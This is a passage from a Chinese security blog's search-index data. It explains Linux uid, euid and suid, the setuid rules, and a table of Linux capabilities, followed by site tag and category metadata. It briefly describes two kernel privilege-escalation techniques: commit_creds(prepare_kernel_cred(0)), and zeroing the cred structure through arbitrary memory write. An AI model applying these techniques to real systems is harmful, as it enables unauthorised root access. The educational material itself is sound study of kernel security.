是保存的euid切换之前的id内核中主要有三个用户：uid（实际用户）、euid（有效用户）、suid（保存用户），可通过setuid、seteuid、setreuid系统调用实现用户切换。setuid规则：1.当有超级用户权限，修改uid,euid,suid为新用户2.当没有超级用户权限，新用户id参数等于uid或suid时，修改euid为新用户两种修改进程cred方式：内核态任意代码执行：使用commit_creds(prepare_kernel_cred(0))，分配新凭证(uid=0,gid=0)给所在进程，从而获取root权限内核态任意地址读写漏洞：爆破内存定位到当前进程的cred位置，将cred结构体的uid~fsgid全部覆写为0(前28字节)capability 能力#为了细分root的权限，将root权限分为37种能力，当非root程序进行操作时，会检查进程的能力，判断是否有权限执行某些操作。man capabilitiescapability 名称描述CAP_AUDIT_CONTROL启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则CAP_AUDIT_READ允许通过 multicast netlink 套接字读取审计日志CAP_AUDIT_WRITE将记录写入内核审计日志CAP_BLOCK_SUSPEND使用可以阻止系统挂起的特性CAP_CHOWN修改文件所有者的权限CAP_DAC_OVERRIDE忽略文件的 DAC 访问限制CAP_DAC_READ_SEARCH忽略文件读及目录搜索的 DAC 访问限制CAP_FOWNER忽略文件属主 ID 必须和进程用户 ID 相匹配的限制CAP_FSETID允许设置文件的 setuid 位CAP_IPC_LOCK允许锁定共享内存片段CAP_IPC_OWNER忽略 IPC 所有权检查CAP_KILL允许对不属于自己的进程发送信号CAP_LEASE允许修改文件锁的 FL_LEASE 标志CAP_LINUX_IMMUTABLE允许修改文件的 IMMUTABLE 和 APPEND 属性标志CAP_MAC_ADMIN允许 MAC 配置或状态更改CAP_MAC_OVERRIDE覆盖 MAC(Mandatory Access Control)CAP_MKNOD允许使用 mknod() 系统调用CAP_NET_ADMIN允许执行网络管理任务CAP_NET_BIND_SERVICE允许绑定到小于 1024 的端口CAP_NET_BROADCAST允许网络广播和多播访问CAP_NET_RAW允许使用原始套接字CAP_SETGID允许改变进程的 GIDCAP_SETFCAP允许为文件设置任意的 capabilitiesCAP_SETPCAP参考 capabilities man pageCAP_SETUID允许改变进程的 UIDCAP_SYS_ADMIN允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等CAP_SYS_BOOT允许重新启动系统CAP_SYS_CHROOT允许使用 chroot() 系统调用CAP_SYS_MODULE允许插入和删除内核模块CAP_SYS_NICE允许提升优先级及设置其他进程的优先级CAP_SYS_PACCT允许执行进程的 BSD 式审计CAP_SYS_PTRACE允许跟踪任何进程CAP_SYS_RAWIO允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备CAP_SYS_RESOURCE忽略资源限制CAP_SYS_TIME允许改变系统时钟CAP_SYS_TTY_CONFIG允许配置 TTY 设备CAP_SYSLOG允许使用 syslog() 系统调用CAP_WAKE_ALARM允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器)参考：https://baijiahao.baidu.com/s?id=1648635487484008654&amp;wfr=spider&amp;for=pchttps://www.codenong.com/cs106888174/https://www.anquanke.com/post/id/98628https://gohalo.me/post/linux-capabilities-introduce.htmlhttp://rk700.github.io/2016/10/26/linux-capabilities/https://cloud.tencent.com/developer/article/1529342","link":"/8f72536d.html"}],"tags":[{"name":"life","slug":"life","link":"/tags/life/"},{"name":"tools","slug":"tools","link":"/tags/tools/"},{"name":"AI","slug":"AI","link":"/tags/AI/"},{"name":"NLP","slug":"NLP","link":"/tags/NLP/"},{"name":"machine learning","slug":"machine-learning","link":"/tags/machine-learning/"},{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"CVE","slug":"CVE","link":"/tags/CVE/"},{"name":"crypto","slug":"crypto","link":"/tags/crypto/"},{"name":"re","slug":"re","link":"/tags/re/"},{"name":"writeup","slug":"writeup","link":"/tags/writeup/"},{"name":"PyQt5","slug":"PyQt5","link":"/tags/PyQt5/"},{"name":"Web","slug":"Web","link":"/tags/Web/"},{"name":"数据库","slug":"数据库","link":"/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"paper","slug":"paper","link":"/tags/paper/"},{"name":"security","slug":"security","link":"/tags/security/"},{"name":"fuzz","slug":"fuzz","link":"/tags/fuzz/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"stack overflow","slug":"stack-overflow","link":"/tags/stack-overflow/"},{"name":"automatic analyse","slug":"automatic-analyse","link":"/tags/automatic-analyse/"},{"name":"others","slug":"others","link":"/tags/others/"},{"name":"mobile security","slug":"mobile-security","link":"/tags/mobile-security/"},{"name":"security situation awareness","slug":"security-situation-awareness","link":"/tags/security-situation-awareness/"},{"name":"pwnable.kr","slug":"pwnable-kr","link":"/tags/pwnable-kr/"},{"name":"Toddler&#39;s Bottle","slug":"Toddler-s-Bottle","link":"/tags/Toddler-s-Bottle/"},{"name":"ROP Emporium","slug":"ROP-Emporium","link":"/tags/ROP-Emporium/"},{"name":"research","slug":"research","link":"/tags/research/"},{"name":"codeql","slug":"codeql","link":"/tags/codeql/"},{"name":"linux kernel","slug":"linux-kernel","link":"/tags/linux-kernel/"},{"name":"pentest","slug":"pentest","link":"/tags/pentest/"},{"name":"windows","slug":"windows","link":"/tags/windows/"}],"categories":[{"name":"life","slug":"life","link":"/categories/life/"},{"name":"tools","slug":"tools","link":"/categories/tools/"},{"name":"AI","slug":"AI","link":"/categories/AI/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"NLP","slug":"AI/NLP","link":"/categories/AI/NLP/"},{"name":"machine_learning","slug":"AI/machine-learning","link":"/categories/AI/machine-learning/"},{"name":"crypto","slug":"CTF/crypto","link":"/categories/CTF/crypto/"},{"name":"CVE","slug":"CTF/CVE","link":"/categories/CTF/CVE/"},{"name":"re","slug":"CTF/re","link":"/categories/CTF/re/"},{"name":"writeup","slug":"CTF/writeup","link":"/categories/CTF/writeup/"},{"name":"PyQt5","slug":"PyQt5","link":"/categories/PyQt5/"},{"name":"Web","slug":"PyQt5/Web","link":"/categories/PyQt5/Web/"},{"name":"图书馆管理系统","slug":"PyQt5/图书馆管理系统","link":"/categories/PyQt5/%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"},{"name":"papers","slug":"papers","link":"/categories/papers/"},{"name":"pwn","slug":"CTF/pwn","link":"/categories/CTF/pwn/"},{"name":"security","slug":"papers/security","link":"/categories/papers/security/"},{"name":"stack_overflow","slug":"CTF/pwn/stack-overflow","link":"/categories/CTF/pwn/stack-overflow/"},{"name":"mobile_security","slug":"papers/security/mobile-security","link":"/categories/papers/security/mobile-security/"},{"name":"fuzz","slug":"papers/security/fuzz","link":"/categories/papers/security/fuzz/"},{"name":"security_situation_awareness","slug":"papers/security/security-situation-awareness","link":"/categories/papers/security/security-situation-awareness/"},{"name":"automatic_analyse","slug":"papers/security/automatic-analyse","link":"/categories/papers/security/automatic-analyse/"},{"name":"others","slug":"papers/security/others","link":"/categories/papers/security/others/"},{"name":"pwnable.kr","slug":"CTF/pwn/pwnable-kr","link":"/categories/CTF/pwn/pwnable-kr/"},{"name":"Toddler&#39;sBottle","slug":"CTF/pwn/pwnable-kr/Toddler-sBottle","link":"/categories/CTF/pwn/pwnable-kr/Toddler-sBottle/"},{"name":"ROP_Emporium","slug":"CTF/pwn/stack-overflow/ROP-Emporium","link":"/categories/CTF/pwn/stack-overflow/ROP-Emporium/"},{"name":"research","slug":"research","link":"/categories/research/"},{"name":"codeql","slug":"research/codeql","link":"/categories/research/codeql/"},{"name":"pentest","slug":"CTF/pentest","link":"/categories/CTF/pentest/"},{"name":"linux_kernel","slug":"research/linux-kernel","link":"/categories/research/linux-kernel/"},{"name":"windows","slug":"research/windows","link":"/categories/research/windows/"}]}